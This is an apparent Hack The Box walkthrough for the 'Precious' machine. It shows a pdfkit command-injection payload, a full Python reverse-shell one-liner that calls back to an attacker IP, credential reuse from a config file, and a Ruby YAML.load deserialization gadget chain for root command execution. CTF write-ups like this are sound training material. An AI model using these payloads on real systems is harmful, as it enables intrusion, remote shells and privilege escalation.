# HTB Machine Precious 

Port scaning with nmap
- port 80 is open : redirect to http://precious.htb/

add this to `/etc/hosts`

On this page we have **Convert Web Page to PDF** functionality 

<img width="474" alt="image" src="https://user-images.githubusercontent.com/79740895/231573264-a9246425-3e38-4e9d-8b5a-431684ceff6f.png">

after giving url pdf file is downloaded 

using exiftool on pdf we know that it is _Generated by pdfkit v0.8.6_

This version is vulnerable to RCE 

Payload: 
```url
http://%20`{command}`
```

we can use this to get reverse shell

```shell
http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.40",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
```

references: https://www.revshells.com/

we get shell as user ruby

<img width="216" alt="image" src="https://user-images.githubusercontent.com/79740895/231575127-06729034-9ced-4058-bc70-6b335f7044f9.png">

we can see two user in /home directory 

<img width="83" alt="image" src="https://user-images.githubusercontent.com/79740895/231575282-f6f90c02-7aa8-4d87-ba56-d603b07b02eb.png">

user flag is in directory of user henry but it is not accessible.

inside the directory of user ruby there is config file in .bundle in this file we can see password of user henry

<img width="252" alt="image" src="https://user-images.githubusercontent.com/79740895/231575704-cd2668c0-8a7e-4542-91bb-669cb7bdaed1.png">

we can use this for ssh to henry

user can run /opt/update_dependencies.rb as root with sudo

<img width="344" alt="image" src="https://user-images.githubusercontent.com/79740895/231576872-90fbe14a-5858-4480-83a5-901366213b58.png">

this file is not writable. looking at code we see it use YAML.load, which is vulnerable to deserialization attack.

<img width="213" alt="image" src="https://user-images.githubusercontent.com/79740895/231577426-1faf86eb-003b-4c17-be99-0ca2b7c79a60.png">

we can write in dependencies.yml

payload:
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cat /root/root.txt
         method_id: :resolve
```

reference: https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml

now we can run this with sudo and get the root flag
`sudo /usr/bin/ruby /opt/update_dependencies.rb`


This give root flag.

<br>

:octocat: Happy Hacking :octocat:


